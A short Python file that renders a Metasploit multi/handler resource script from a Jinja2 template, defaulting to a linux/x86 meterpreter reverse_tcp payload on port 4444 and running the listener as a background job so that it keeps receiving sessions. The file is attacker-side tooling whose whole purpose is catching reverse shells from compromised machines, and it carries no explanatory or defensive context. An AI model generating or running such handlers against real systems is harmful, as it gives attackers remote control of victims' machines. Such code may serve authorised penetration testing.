from jinja2 import Template

MSF_HANDLER = """use exploit/multi/handler
set PAYLOAD {{payload}}
set LHOST {{lhost}}
set LPORT {{lport}}
set ExitOnSession false
exploit -j -z
"""

def generate_handler(payload="linux/x86/meterpreter/reverse_tcp", lhost="127.0.0.1", lport=4444):
    t = Template(MSF_HANDLER)
    return t.render(payload=payload, lhost=lhost, lport=lport)
